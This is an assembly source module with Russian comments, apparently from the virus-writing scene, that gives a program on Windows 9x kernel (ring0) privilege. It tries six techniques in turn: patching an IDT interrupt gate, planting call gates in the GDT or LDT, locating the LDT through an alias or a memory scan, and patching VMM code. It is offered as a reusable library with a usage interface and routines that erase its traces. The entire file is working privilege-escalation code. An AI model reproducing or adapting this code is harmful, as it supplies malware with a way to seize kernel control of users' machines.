;=============================================================================
; Ring0 under windows in PE files.
; Written by Green Monster, Russia.
;-----------------------------------------------------------------------------
; Модуль специализируется на переходе в ring0 под win9x.
; Используется 6 различных методов.
; Общие требования при вызове ЛЮБЫХ функций.
;    1. DS=SS=0:FFFFFFFF.data32.RW
;    2. EBP = стандартная дельта. Через нее идет обращение к переменным
;-----------------------------------------------------------------------------
; Использование (в своей проге):
;   USE_LDTS = 1          ;Если хотите, чтобы метод LDTS тоже использовался
;   ....
;   call   R0PE_Init          ;Инициализация модуля
;   jc     @@error            ;Ошибка инициализации
;   ....
;   lea    ebx, R0_Proc       ;EBX -> чаво запускать в ring0 (function:near)
;   call   R0PE_Exec          ;Запустить функцию в ring0
;   ....
;   call   R0PE_Done          ;Не обязательно, НО КРАЙНЕ ЖЕЛАТЕЛЬНО
;                             ;Освобождает занятые селекторы.
;=============================================================================
                                       ;
LOCALS @@                              ;Дык метки локальные будут
                                       ;
VMM_XPROC_ADDR = 0C0001000h            ;Некая процедура, вызываемая VMM при
                                       ;переключении ниток.
                                       ;
;-----------------------------------------------------------------------------
                                       ;Методы перехода в ring0
METHOD_IDT  = 0                        ;Патч IDT
METHOD_GDT  = 1                        ;Шлюз в GDT
METHOD_LDT  = 2                        ;Шлюз в LDT
METHOD_LDTA = 3                        ;Поиск алиаса LDT
METHOD_LDTS = 4                        ;Поиск LDT в памяти (опционально)
METHOD_PVMM = 5                        ;Патч кода VMM
METHOD_LAST = METHOD_PVMM              ;Последний проверяемый метод
                                       ;
IFDEF DEBUG                            ;
  DEFAULT_INT = 5                      ;Прерывание для метода IDT
ELSE                                   ;
  DEFAULT_INT = 5                      ;То же, но без DEBUG'а (м.б. INT 3)
ENDIF                                  ;
                                       ;
SELS_TO_SAVE = 8                       ;Длина сигнатуры в селекторах
                                       ;(для метода LDTS)
                                       ;
;=============================================================================
; Пытается найти приемлемый на данной машине метод перехода в ring0.
;=============================================================================
;  Вход: AL = стартовый метод
; Выход: EAX = последний опробованный метод
;         CF - флаг ошибки
;-----------------------------------------------------------------------------
R0PE_Init    proc                      ;
      push   gs                        ;GS будет использован
      pusha                            ;
                                       ;
      movzx  eax, al                   ;Стартовый метод
                                       ;
  @@next_method:                       ;
      push   eax                       ;
      lea    esi, r0pe_mprocs[ebp]     ;Возьмем адрес процедуры для метода
      shl    eax, 2                    ;
      add    eax, esi                  ;
      add    eax, ebp                  ;
                                       ;
      call   [eax]                     ;Вызываем
      pop    eax                       ;
      jnc    @@exit                    ;Нет ошибки?
                                       ;
      inc    al                        ;Следующий метод
      cmp    al, METHOD_LAST           ;
      jbe    @@next_method             ;
      dec    al                        ;
                                       ;
      stc                              ;Ну надо же! Ни один не подошел ;-(
                                       ;
  @@exit:                              ;
      mov    [esp+1Ch], eax            ;
      popa                             ;
      pop    gs                        ;
      ret                              ;
R0PE_Init    endp                      ;
                                       ;
;-----------------------------------------------------------------------------
r0pe_mprocs:                           ;Адреса процедур для методов
      dd     r0pe_idt                  ;            IDT
      dd     r0pe_gdt                  ;            GDT
      dd     r0pe_ldt                  ;            LDT
      dd     r0pe_ldta                 ;            LDTA
      dd     r0pe_ldts                 ;            LDTS
      dd     r0pe_pvmm                 ;            PVMM
                                       ;
;=============================================================================
; Исполняет указанную функцию в ring0
;=============================================================================
; Вход:  EBX = смещение функции в сегменте С БАЗОЙ 0 !!!
;              (Функция должна заканчиваться RET'ом и не должна менять
;               DS,SS,EBP. [см. общие требования ])
;        ??? - Какие-ньдь аргументы для функции.
;
; Выход: ??? - что функция вернет...
;-----------------------------------------------------------------------------
R0PE_Exec    proc                      ;
      cmp    r0pe_method[ebp], METHOD_IDT  ;Это метод IDT?
      jne    @@non_idt                 ;
                                       ;Тогда вызываем прерывание
             db    0CDh                ;
r0pe_int     db    DEFAULT_INT         ;
                                       ;
      ret                              ;Возвращаемся
                                       ;
  @@non_idt:                           ;Не IDT...
             db    09Ah                ;Тогда вызываем через шлюз
             dd    '666 '              ;
r0pe_cgsel   dw    ?                   ;Сегмент шлюза
                                       ;
      ret                              ;Возвращаемся
R0PE_Exec    endp                      ;
                                       ;
;=============================================================================
; Done,Deinit,Destructor, если хотите...
; Подчищает следы. Восстанавливает шлюз в IDT либо стирает в GDT/LDT.
;=============================================================================
;  Вход: ничего
; Выход: опять ничего
;-----------------------------------------------------------------------------
R0PE_Done    proc                      ;
      push   eax gs                    ;
                                       ;
      mov    al, r0pe_method[ebp]      ;
      cmp    al, METHOD_IDT            ;
      jne    @@non_idt                 ;
                                       ;Если метод IDT:
      mov    esi, r0pe_cgaddr[ebp]     ;Восстанавливаем шлюз
      mov    eax, r0pe_oldcgo[ebp]     ;
      mov    [esi+6], ax               ;
      shr    eax, 10h                  ;
      mov    [esi], ax                 ;
      jmp    @@exit                    ;
                                       ;
  @@non_idt:                           ;
      push   ds                        ;Если не LDTA, то GS=DS
      pop    gs                        ;
      cmp    al, METHOD_LDTA           ;
      jne    @@non_ldta                ;
      mov    gs, r0pe_ldtalias[ebp]    ;Иначе GS=алиасу LDT
                                       ;
  @@non_ldta:                          ;
      mov    eax, r0pe_cgaddr[ebp]     ;EAX -> дескриптор шлюза
      call   Free_Descriptor           ;Убить
      mov    eax, r0pe_r0cs[ebp]       ;EAX = селектор на code32
      call   Free_Sel                  ;Убить
                                       ;
  @@exit:                              ;
      pop    gs eax                    ;
      ret                              ;Возвращаемся
R0PE_Done    endp                      ;
                                       ;
;=============================================================================
; Этот кусок кода получит управление при вызове прерывания в методе IDT либо
; шлюза во всех остальных.
; Необходим для единообразия интерфейса.
;=============================================================================
;  Вход: EBX -> функцию, которую надо-таки вызвать
; ВЫход: что-ньть от функции
;-----------------------------------------------------------------------------
r0pe_ring0_proc  proc                  ;
      call   ebx                       ;Вызываем функцию
                                       ;Возврат управления на ring3
      cmp    r0pe_method[ebp], METHOD_IDT ;
      jne    @@non_idt                 ;
      iret                             ;В методе IDT это IRET
  @@non_idt:                           ;
      retf                             ;В остальных - RETF
r0pe_ring0_proc  endp                  ;
                                       ;
;*****************************************************************************
; Конец междумордия (aka interface), начало реализации
;*****************************************************************************
                                       ;
                                       ;
                                       ;
;=============================================================================
; Проверяет возможность чтения/записи БАЙТА с указанного адреса.
;=============================================================================
;  Вход: ESI = адрес для тестирования
; Выход: EAX = результат (может трактоваться как права доступа страницы памяти)
;              0000
;                │└─ можно читать
;                └── можно писать
;        Флаги:
;          ZF = 1 - адрес доступен для чтения и записи
;          ZF = 0 - есть частичное/полное ограничение
;-----------------------------------------------------------------------------
TestPtr      proc                      ;
      xor    eax, eax                  ;
      mov    al, 3                     ;EAX = 3 по умолчанию
                                       ;
      pusha                            ;Регистры в стек
                                       ;
      call   @@test                    ;Push IP+5 / jmp @@test
                                       ;
;---- -= Expection Handler =- ---------;
                                       ;Сюды управление попадает, ежели
                                       ;адрес недоступен.
                                       ;Много лишнего, но что-то со SPIDER'ом
                                       ;немало глючил.
                                       ;
      mov    eax, [esp+0Ch]            ;EH_ContextRecord
                                       ;
      push   ecx edx                   ;Сохраним EDX
      call   $+5                       ;
      pop    ecx                       ;
      mov    edx, [eax+0B8h]           ;CONTEXT_Eip
      cmp    edx, ecx                  ;Это близко к нам?
      jb     @@next                    ;
      add    ecx, 1000h                ;
      cmp    edx, ecx                  ;
      ja     @@next                    ;
                                       ;
      inc    edx                       ;
      inc    edx                       ;
      mov    [eax+0B8h], edx           ;Сделали шаг
                                       ;
      mov    edx, [eax+0C4h]           ;CONTEXT_Esp
      mov    al, byte ptr [eax+0B0h+1] ;CONTEXT_Eax (берем ah из pusha)
      and    [edx+8+1Ch], al           ;Правим al в pusha
                                       ;
  @@next:                              ;
      pop    edx ecx                   ;
      xor    eax, eax                  ;ok - Виндам
      ret                              ;
                                       ;
;--------------------------------------;
                                       ;
   @@test:                             ;Установим SEH
      xor    eax, eax                  ;
      push   dword ptr fs:[eax]        ;
      mov    fs:[eax], esp             ;
                                       ;
      mov    ah, not 01b               ;AH = маска для сброса бита 1
      mov    al, [esi]                 ;Адрес читается?
      mov    ah, not 10b               ;AH = маска для сброса бита 2
      xchg   al, [esi]                 ;Адрес пишется?
                                       ;
  @@exit:                              ;
      xor    eax, eax                  ;Восстановим SEH
      pop    dword ptr fs:[eax]        ;
      pop    eax                       ;
                                       ;
      popa                             ;Регистры со стека
                                       ;
      cmp    eax, 3                    ;Установим флаги.
      ret                              ;
TestPtr      endp                      ;
                                       ;
;=============================================================================
;Метод IDT
;Как говорится, well known.
;   1. Страничка IDT проверяется на чтение/запись.
;   2. В стрелку шлюза прерывания DEFAULT_INT прописывается смещение
;      нашей функции.
;=============================================================================
r0pe_idt     proc                      ;
      mov     r0pe_method[ebp], METHOD_IDT
                                       ;
      sidt   fword ptr r0pe_idtlimit[ebp]  ;Поимеем параметры IDT'ы
      mov    esi, r0pe_idtbase[ebp]    ;ESI -> IDT.base
      call   TestPtr                   ;Проверим читаемость/писаемость ;)
      mov    r0pe_idtrights[ebp], al   ;Сохраним права
      jnz    @@error                   ;Если неполностью доступна - выход
                                       ;
      xor    eax, eax                  ;
      mov    al, r0pe_int[ebp]         ;EAX = номер прерывания
      shl    eax, 3                    ;
      add    esi, eax                  ;ESI -> шлюз прерывания в IDT
      mov    r0pe_cgaddr[ebp], esi     ;Сохраним алрес шлюза
      movzx  eax, word ptr [esi+2]     ;Сохраним селектор на code32 (обычно 28h)
      mov    r0pe_r0cs[ebp], eax       ;
                                       ;Поменяем адрес в шлюзе
      lea    eax, r0pe_ring0_proc[ebp] ;на смещение нашей дежурной процедуры.
      xchg   ax, [esi]                 ;
      ror    eax, 10h                  ;
      xchg   ax, [esi+6]               ;
      mov    r0pe_oldcgo[ebp], eax     ;Сохраним старый адрес
                                       ;
  @@ok:                                ;
      clc                              ;ok
      ret                              ;
  @@error:                             ;
      stc                              ;fu
      ret                              ;
r0pe_idt     endp                      ;BCE!!!
                                       ;
;-----------------------------------------------------------------------------
; Тестирует права странички с базовым адресом GDT
;-----------------------------------------------------------------------------
;  Вход: ничего
; Выход: EAX - права: 00
;                     │└─ читается
;                     └── пишется
;        Флаги (как результат сравнения EAX с 1):
;              Cz - не читается И не пишется
;              cZ - читается, но не пишется
;              cz - пишется и, возможно, читается
;-----------------------------------------------------------------------------
r0pe_test_gdt  proc                    ;
      sgdt   fword ptr r0pe_gdtlimit[ebp]  ;Сохраним параметры GDT
      mov    esi, r0pe_gdtbase[ebp]    ;ESI = GDT.base
      call   TestPtr                   ;Тестируем
      mov    r0pe_gdtrights[ebp], al   ;Сохраним права
      ret                              ;Возвращаемся
r0pe_test_gdt  endp                    ;
                                       ;
;-----------------------------------------------------------------------------
; Выделяет ПЕРВЫЙ НУЛЕВОЙ дескриптор в xDT.
;-----------------------------------------------------------------------------
;  Вход: ECX = xDT.limit
;        ESI = xDT.base
;         GS = селектор сегмента, в котором ESI - база xDT
;              (может быть = DS или алиасу LDT)
;
; Выход: EAX = линейный адрес дескриптора (вкл. базу xDT)
;-----------------------------------------------------------------------------
Alloc_Descriptor    proc               ;
      push   ebx ecx                   ;
                                       ;
      xor    eax, eax                  ;EAX = 0          : будем искть нули
      lea    ebx, [esi+8]              ;EBX = base+8     : первый дескриптор
      and    cl, not 111b              ;                 :
      add    ecx, esi                  ;ECX = base+limit : последний адрес
                                       ;
  @@next_dsc:                          ;
      cmp    eax, gs:[ebx]             ;Ноль?
      jne    @@loop                    ;
      cmp    eax, gs:[ebx+4]           ;Ноль?
      jne    @@loop                    ;
      mov    eax, ebx                  ;Дескриптор найден
      jmp    @@ok                      ;
  @@loop:                              ;
      add    ebx, 8                    ;Следующий дескриптор
      cmp    ebx, ecx                  ;Уже хватит?
      jbe    @@next_dsc                ;
      stc                              ;Облом
      jmp    @@exit                    ;
                                       ;
  @@ok:                                ;
      mov    gs:[ebx], ebx             ;Застолбим от врагов
      clc                              ;
                                       ;
  @@exit:                              ;
      pop    ecx ebx                   ;
      ret                              ;
Alloc_Descriptor    endp               ;
                                       ;
;-----------------------------------------------------------------------------
; Убивает дескриптор.
;-----------------------------------------------------------------------------
; Вход: EAX = адрес дескриптора
;-----------------------------------------------------------------------------
Free_Descriptor     proc               ;
      mov    dword ptr gs:[eax], 0     ;Убить первую...
      mov    dword ptr gs:[eax+4], 0   ;...и вторую половины дескриптора
      clc                              ;Все ok
      ret                              ;
Free_Descriptor     endp               ;
                                       ;
;-----------------------------------------------------------------------------
; Убивает дескриптор по его селектору.
;-----------------------------------------------------------------------------
; Вход: EAX = селектор
;-----------------------------------------------------------------------------
Free_Sel            proc               ;
      push   esi gs                    ;
      push   ds                        ;
      pop    gs                        ;GS=DS
      mov    esi, r0pe_gdtbase[ebp]    ;ESI = GDT.base
      test   al, 100b                  ;Это селектор из LDT?
      jz     @@free                    ;
      mov    esi, r0pe_ldtbase[ebp]    ;Тогда ESI = LDT.base
                                       ;
      cmp    r0pe_method[ebp], METHOD_LDTA  ;Это метод с алиасом?
      jne    @@free                    ;
      mov    gs, r0pe_ldtalias[ebp]    ;Тогда GS = алиасу LDT
                                       ;
  @@free:                              ;
      and    al, not 111b              ;Сбрасывем 3 бита
      add    eax, esi                  ;Вычисляем линейный адрес дескриптора
      call   Free_Descriptor           ;Убиваем дескриптор
      pop    gs esi                    ;
      ret                              ;
Free_Sel            endp               ;
                                       ;
;-----------------------------------------------------------------------------
; Общая процедура построения шлюза в системной таблице xDT.
; (GDT мало чем отличается от LDT)
;-----------------------------------------------------------------------------
; Вход:  ECX = xDT.limit
;        ESI = xDT.base (относительно GS)
;         GS = селектор, в котором ESI = базе xDT
;-----------------------------------------------------------------------------
Build_xDT_CallGate  proc               ;
      call   Alloc_Descriptor          ;Выделим дескриптор
      jc     @@exit                    ;
      mov    ebx, eax                  ;
      call   Alloc_Descriptor          ;Еще один
      jnc    @@allocated               ;
      mov    eax, ebx                  ;Если ошибка, освободим первый
      call   Free_Descriptor           ;
      stc                              ;
      jmp    @@exit                    ;И выйдем
                                       ;
  @@allocated:                         ;
      mov    edi, eax                  ;Строим дескриптор сегмента кода
      mov    dword ptr gs:[edi], 0000FFFFh
      mov    dword ptr gs:[edi+4], 00CF9A00h
      sub    edi, esi                  ;EDI = селектор на построенный дескриптор
      cmp    r0pe_method[ebp], METHOD_GDT  ;Это метод GDT?
      je     @@1                       ;
      or     di, 100b                  ;Если нет - использовать LDT
  @@1:                                 ;
      mov    r0pe_r0cs[ebp], edi       ;Сохраним селектор
                                       ;
                                       ;Строим шлюз
      mov    r0pe_cgaddr[ebp], ebx     ;
      lea    eax, r0pe_ring0_proc      ;
      mov    gs:[ebx], ax              ;
      shr    eax, 10h                  ;
      mov    gs:[ebx+6], ax            ;
      mov    ecx, edi                  ;
      mov    gs:[ebx+2], ecx           ;
      mov    byte ptr gs:[ebx+5], 11101100b ;
      sub    ebx, esi                  ;EBX = селектор шлюза
                                       ;
      or     bl, 011b                  ;RPL = 3
      cmp    r0pe_method[ebp], METHOD_GDT
      je     @@2                       ;
      or     bl, 100b                  ;Использовать LDT
  @@2:                                 ;
      mov    r0pe_cgsel[ebp], bx       ;Сохраним селектор шлюза
                                       ;
      clc                              ;
                                       ;
  @@exit:                              ;
      ret                              ;
Build_xDT_CallGate  endp               ;
                                       ;
;-----------------------------------------------------------------------------
;Метод GDT
;  1. Страничка GDT тестируется на чтение/запись.
;  2. В GDT cтроится беспредельный кодовый сегмент (на маздай надейся, а сам...)
;  3. В GDT строится шлюз на энтот сегмент.
;-----------------------------------------------------------------------------
r0pe_gdt     proc                      ;
      mov     r0pe_method[ebp], METHOD_GDT
                                       ;
      push   ds                        ;
      pop    gs                        ;GS=DS
      call   r0pe_test_gdt             ;Тестируем GDT
      movzx  ecx, r0pe_gdtlimit[ebp]   ;
      je     Build_xDT_CallGate        ;Строим шлюз, если полностью доступна
      stc                              ;Облом
      ret                              ;
r0pe_gdt     endp                      ;
                                       ;
;-----------------------------------------------------------------------------
;Метод LDT
;  1. GDT проверяется на доступность чтения
;  2. Адрес LDT вычисляется самым легальным способом (через SLDT)
;  3. LDT проверяется на доступность чтения/записи.
;  4. В LDT cтроится беспредельный кодовый сегмент
;  5. В LDT строится шлюз на этот сегмент.
;-----------------------------------------------------------------------------
r0pe_ldt     proc                      ;
      mov     r0pe_method[ebp], METHOD_LDT
                                       ;
      push   ds                        ;
      pop    gs                        ;GS=DS
      call   r0pe_test_gdt             ;Тестируем GDT
      test   al, 01b                   ;Должна быть доступна для чтения
      jz     @@error                   ;Недоступна - выход.
                                       ;
      xor    eax, eax                  ;
      sldt   ax                        ;EAX = системный селектор LDT
      and    al, not 111b              ;
      add    eax, esi                  ;EAX -> системный дескриптор LDT
                                       ;
      xor    ecx, ecx                  ;
      mov    cx, [eax]                 ;ECX = LDT.limit
      mov    r0pe_ldtlimit[ebp], cx    ;
      push   ecx                       ;
                                       ;
      mov    bl, [eax+7]               ;
      shl    bx, 8                     ;
      mov    bl, [eax+4]               ;
      shl    ebx, 10h                  ;
      mov    bx, [eax+2]               ;
      mov    r0pe_ldtbase[ebp], ebx    ;EBX = LDT.base
                                       ;
      mov    esi, ebx                  ;
      call   TestPtr                   ;Тестируем LDT
      mov    r0pe_ldtrights[ebp], al   ;
                                       ;
      pop    ecx                       ;
      jz     Build_xDT_CallGate        ;Если полностью доступна, строим шлюз
                                       ;Иначе...
  @@error:                             ;
      stc                              ;Облом
      ret                              ;
r0pe_ldt     endp                      ;
                                       ;
;-----------------------------------------------------------------------------
;                 Search LDT Alias (tm) for Fucken Win9x (tm).
;           Ищет алиас LDT в самой LDT, просматривая 2000h селекторов.
;-----------------------------------------------------------------------------
SLA    proc                             ;ESI = лимит LDT.
       mov   ecx, 2000h                 ;Сколько селекторов сканируем
       mov   ebx, 7                     ;Первый селектор
                                        ;
  test_sels:                            ;Начали
       lsl   eax, ebx                   ;EAX = лимит селектора
       jnz   next_sel                   ;Выпрыгнули, если недоступен
       cmp   eax, esi                   ;
       jne   next_sel                   ;
       mov   r0pe_ldtlimit[ebp], ax     ;Сохраним лимит
                                        ;
       lar   eax, ebx                   ;AX = права сегмента
                                        ;
       mov   al, ah                     ;
       test  al, 10000000b              ;Присутствует?
       jz    next_sel                   ;Нет? Ну его к чОрту!
       test  al, 00010000b              ;Системный?
       jz    next_sel                   ;Туда же!
                                        ;
       push  ax                         ;
       shr   al, 5                      ;
       and   al, 11b                    ;
       cmp   al, 3                      ;Проверяем DPL (не нужен, если < 3)
       pop   ax                         ;
       jne   next_sel                   ;
       and   al, 1110b                  ;
       cmp   al, 0010b                  ;
       jne   next_sel                   ;Должен быть Data&Writable
                                        ;
       mov   gs, ebx                    ;GS = найденный селектор
       xor   eax, eax                   ;
       cmp   eax, gs:[eax]              ;LDT[0] = 0?
       jne   next_sel                   ;Нет - не надо.
       cmp   eax, gs:[eax+4]            ;LDT[4] = 0?
       jne   next_sel                   ;Нет - не надо?
                                        ;
;-----------------------------------------------------------------------------
;  Следуем такой логике: если найденный селектор описывает LDT, то наши
;  CS и DS должны быть там прописаны правильно.
;  Это и проверяем.
;-----------------------------------------------------------------------------
       mov   ecx, cs                    ;Проверяем CS
       and   cl, not 111b               ;
       cmp   word ptr gs:[ecx+2], ax    ;0?
       jne   next_sel                   ;
       cmp   word ptr gs:[ecx+4], 1111101100000000b  ;Все его свойства
       jne   next_sel                   ;
                                        ;
       mov   ecx, ds                    ;Поверяем DS
       and   cl, not 111b               ;
       cmp   word ptr gs:[ecx+2], ax    ;
       jne   next_sel                   ;
       cmp   word ptr gs:[ecx+4], 1111011100000000b
       jne   next_sel                   ;
                                        ;EBX скорее всего = алиасу LDT !!!
       clc                              ;
       ret                              ;
                                        ;
  next_sel:                             ;Следующий...
       add   ebx, 8                     ;
       dec   ecx                        ;
       jnz   test_sels                  ;
       stc                              ;
       ret                              ;
SLA    endp                             ;
                                        ;
;-----------------------------------------------------------------------------
;Метод LDTA
;  1. Предполагается, что размер LDT выровнен на 1000h и что в самой LDT
;     существует алиас LDT (data32.RW)
;  2. Просматриваем 2000h селекторов от начала LDT и пытаемся найти нечто,
;     похожее на алиас.
;-----------------------------------------------------------------------------
r0pe_ldta    proc                       ;
       mov     r0pe_method[ebp], METHOD_LDTA
                                        ;
       mov     esi, fs                  ;Это часто срабатывает
       and     esi, not 0FFFh           ;
       add     esi, 01FFFh              ;
       call    SLA                      ;Ищем алиас
       jnc     found                    ;Нашли?
                                        ;
                                        ;Тогда методом "головой об стену"
                                        ;
       mov     esi, 0FFFh               ;Предположим для начала 0FFFh
                                        ;
  brute_force:                          ;
       call    SLA                      ;Ищем алиас
       jnc     found                    ;Нашли?
                                        ;
       add     esi, 1000h               ;Следующий возможный лимит
       cmp     esi, 9FFFh               ;Уже хватит?
       jbe     brute_force              ;
                                        ;
       stc                              ;
       ret                              ;
                                        ;
  found:                                ;Ура!
       mov     r0pe_ldtalias[ebp], gs   ;Сохраним алиас LDT
       xor     esi, esi                 ;База = 0 (по отношению к алиасу)
       mov     r0pe_ldtbase[ebp], esi   ;Сохранили
       movzx   ecx, r0pe_ldtlimit[ebp]  ;Взяли лимит LDT
       jmp     Build_xDT_CallGate       ;Пошли строить шлюз
r0pe_ldta    endp                       ;
                                        ;
                                        ;
IFNDEF  USE_LDTS                        ;
                                        ;
r0pe_ldts      proc                     ;Пустышка, если метод не используется
       stc                              ;
       ret                              ;
r0pe_ldts      endp                     ;
                                        ;
ELSE                                    ;
                                        ;
;-----------------------------------------------------------------------------
;Метод LDTS
;  1. Просматривается несколько доступных селекторов LDT и запоминаются
;     их лимиты.
;  2. Ищем по памяти структуру LDT в соответствии с запомненными полями.
;-----------------------------------------------------------------------------
r0pe_ldts      proc                     ;
       mov     r0pe_method[ebp], METHOD_LDTS
                                        ;Сначала запоминаем селекторы LDT и
                                        ;и их лимиты.
                                        ;
       mov     ecx, SELS_TO_SAVE        ;ECX = сколько надобно запомнить
       lea     edi, r0pe_sels[ebp]      ;EDI -> буфер
       mov     ebx, 0Fh                 ;EBX = стартовый селектор
                                        ;
  @@save_sels:                          ;
       lsl     eax, ebx                 ;EAX = лимит селектора в EBX
       jnz     @@loop                   ;Недоступен?
                                        ;
       mov     dx, bx                   ;
       and     dl, not 111b             ;Преобразуем селектор в адрес
       mov     [edi], dx                ;Запоминаем
       inc     edi                      ;
       inc     edi                      ;
       mov     [edi], ax                ;Запоминаем лимит
       inc     edi                      ;
       inc     edi                      ;
                                        ;
       dec     ecx                      ;Хватит?
       jz      @@saved                  ;
                                        ;
  @@loop:                               ;
       add     ebx, 8                   ;Следующий селектор
       cmp     ebx, 10000h              ;Сканируем 2000h селекторов
       jb      @@save_sels              ;
       jmp     @@error                  ;
                                        ;
  @@saved:                              ;
       call    @@set_SEH                ;Push Ip+5 / jmp @@set_SEH
                                        ;
;------------ -= Exception Handler =- --------------
       mov     eax, [esp+0Ch]           ;EAX = EH_ExceptionContext
       mov     dword ptr [eax+0B8h], offset @@loop_scan  ;CONTEXT_Eip
       xor     eax, eax                 ;
       ret                              ;
;---------------------------------------------------
                                        ;
  @@set_SEH:                            ;Установим SEH
       xor     eax, eax                 ;
       push    dword ptr fs:[eax]       ;
       mov     fs:[eax], esp            ;
                                        ;
       mov     esi, 80000000h           ;Стартовый адрес поиска
       movzx   ebx, word ptr r0pe_sels[ebp]   ;EBX = первый селектор
       add     esi, ebx                 ;
                                        ;
  @@next_dword:                         ;
       mov     ax, word ptr r0pe_sels+2[ebp]  ;AX = лимит первого селектора
       cmp     ax, [esi]                ;Сравниваем
       jne     @@loop_scan              ;
                                        ;
       mov     eax, esi                 ;Проверяем адрес
       sub     eax, ebx                 ;
                                        ;Сравниваем остальное
       lea     edi, r0pe_sels+4[ebp]    ;
       mov     ecx, SELS_TO_SAVE        ;
                                        ;
  @@compare:                            ;
       movzx   eax, word ptr [edi]      ;
       sub     eax, ebx                 ;
       mov     dx, [edi+2]              ;
       cmp     dx, [esi+eax]            ;Сравниваем лимиты
       jne     @@loop_scan              ;
       inc     edi                      ;
       inc     edi                      ;
       inc     edi                      ;
       inc     edi                      ;
       loop    @@compare                ;
                                        ;
       sub     esi, ebx                 ;LDT найдена
       clc                              ;
       jmp     @@exit                   ;
                                        ;
  @@loop_scan:                          ;
       add     esi, 1000h               ;Следующая страничка
       cmp     esi, 90000000h           ;Хватит?
       jbe     @@next_dword             ;
                                        ;
  @@error:                              ;
       stc                              ;Облом
                                        ;
  @@exit:                               ;
       pop     dword ptr fs:[0]         ;Восстановим SEH
       pop     eax                      ;
       jnc     @@prepare                ;Нашли LDT?
                                        ;
  @@ret:                                ;
       ret                              ;Если нет, выходим.
                                        ;
  @@prepare:                            ;
       mov     r0pe_ldtbase[ebp], esi   ;Сохраняем базу
       call    TestPtr                  ;Проверяем доступность
       mov     r0pe_ldtrights[ebp], al  ;
       stc                              ;
       jnz     @@ret                    ;Если ограничено, выходим
                                        ;
       mov     ecx, fs                  ;Вычислим примерный лимит
       and     ecx, not 0FFFh           ;(главное, чтоб не больше, чем
       add     ecx, 0FFFh               ; реальный; меньше можно)
                                        ;
       mov     r0pe_ldtlimit[ebp], cx   ;Сохраним лимит
       push    ds                       ;
       pop     gs                       ;GS=DS
       jmp     Build_xDT_CallGate       ;
r0pe_ldts      endp                     ;
                                        ;
ENDIF                                   ;
                                        ;
;-----------------------------------------------------------------------------
; Привет Зомбию!
; Его идея с патчем VMM.
;
; Поскольку, метод малость нестабильный (или я чегой-то не понЯл :), а
; переключения ниток для каждого перехода ждать долго, больно и противно,
; я использую его только для определения адреса LDT, затем обычное
; построение шлюза и все такое.
;
; Баг: иногда после push xxxxxxxx/ret вылетает int 6, т.к. кодовой
;      странички не оказывается в памяти, то бишь прописывается не тот
;      контекст ;-(
;
;   1. Патчим VMM
;   2. Циклим до переключения ниток
;   3. В ring0 берем адрес LDT из GDT
;   4. Вернувшись, строим шлюз.
;-----------------------------------------------------------------------------
r0pe_pvmm      proc                     ;
       mov     r0pe_method[ebp], METHOD_PVMM
                                        ;
       xor     eax, eax                 ;Поимеем селектор LDT
       sldt    ax                       ;
       mov     r0pe_ldtsel[ebp], eax    ;
                                        ;Установим переменные
       lea     ebx, r0pe_r0proc[ebp]    ;
       mov     dword ptr r0pe_paddr[ebp], ebx
       xor     eax, eax                 ;
       mov     r0pe_flag[ebp], al       ;
       mov     dword ptr delta1[ebp], ebp
                                        ;Пропатчим процедуру
       mov     esi, VMM_XPROC_ADDR      ;
       cld                              ;
       lodsd                            ;
       mov     dword ptr restore1[ebp], eax
       std                              ;
       lodsd                            ;
       cld                              ;
       mov     dword ptr restore2[ebp], eax
       fild    qword ptr r0pe_patchcode[ebp]
       fistp   qword ptr [esi]          ;
                                        ;
   @@wait:                              ;Циклим
       cmp     r0pe_flag[ebp], 0        ;
       je      @@wait                   ;
                                        ;
       push    ds                       ;
       pop     gs                       ;
       mov     esi, r0pe_ldtbase[ebp]   ;
       movzx   ecx, r0pe_ldtlimit[ebp]  ;
       jmp     Build_xDT_CallGate       ;Строим шлюз
r0pe_pvmm      endp                     ;
                                        ;
;-----------------------------------------------------------------------------
; Вызывается из VMM
;-----------------------------------------------------------------------------
r0pe_r0proc    proc                     ;
       push    eax ebx ebp              ;
                                        ;
       mov     ebp, 12345678h           ;EBP = дельте
  delta1 equ $-4                        ;
                                        ;
       push    ebx                      ;
       sgdt    [esp-2]                  ;
       pop     ebx                      ;EBX = GDT.base
                                        ;
       add     ebx, r0pe_ldtsel[ebp]    ;EAX -> системный дескриптор LDT
                                        ;
       xor     eax, eax                 ;
       mov     ax, ss:[ebx]             ;ECX = LDT.limit
       mov     r0pe_ldtlimit[ebp], ax   ;
                                        ;Берем базу LDT
       mov     al, ss:[ebx+7]           ;
       shl     ax, 8                    ;
       mov     al, ss:[ebx+4]           ;
       shl     eax, 10h                 ;
       mov     ax, ss:[ebx+2]           ;
       mov     r0pe_ldtbase[ebp], eax   ;Сохраняем
                                        ;Восстанавливаем VMM
       mov     dword ptr ss:[VMM_XPROC_ADDR], 12345678h
  restore1 equ $-4                      ;
       mov     dword ptr ss:[VMM_XPROC_ADDR+4], 12345678h
  restore2 equ $-4                      ;
                                        ;
       inc     r0pe_flag[ebp]           ;Разрешаем выход из цикла в нашей нитке
                                        ;
       pop     ebp ebx eax              ;
                                        ;
       push    VMM_XPROC_ADDR           ;Перезапускаем функцию VMM
       retn                             ;
r0pe_r0proc    endp                     ;
                                        ;
;-----------------------------------------------------------------------------
;Будет впатчено в начало функции VMM
;-----------------------------------------------------------------------------
r0pe_patchcode:                         ;
       push    12345678h                ;
  r0pe_paddr equ $-4                    ;
       ret                              ;
                                        ;
;-----------------------------------------------------------------------------
r0pe_flag        db    ?                ;Флажок (PVMM)
r0pe_ldtsel      dd    ?                ;Селектор LDT (PVMM)
                                        ;
;-----------------------------------------------------------------------------
r0pe_oldcgo      dd    ?                ;Старый адрес из шлюза прерывания
                                        ;
r0pe_cgaddr      dd    ?                ;Адрес шлюза
r0pe_r0cs        dd    ?                ;Селектор на сегмент code32
                                        ;
r0pe_ldtalias    dw    ?                ;Алиас LDT
                                        ;
r0pe_idtrights   db    ?                ;Права IDT
r0pe_idtlimit    dw    ?                ;Лимит IDT
r0pe_idtbase     dd    ?                ;База  IDT
r0pe_gdtrights   db    ?                ;Права GDT
r0pe_gdtlimit    dw    ?                ;Лимит GDT
r0pe_gdtbase     dd    ?                ;База  GDT
r0pe_ldtrights   db    ?                ;Права LDT
r0pe_ldtlimit    dw    ?                ;Лимит LDT
r0pe_ldtbase     dd    ?                ;База  LDT
                                        ;
r0pe_method      db    ?                ;Метод перехода в ring0

IFDEF  USE_LDTS
r0pe_sels        dd    SELS_TO_SAVE*2 dup(?)   ;Место для сигнатуры LDT
ENDIF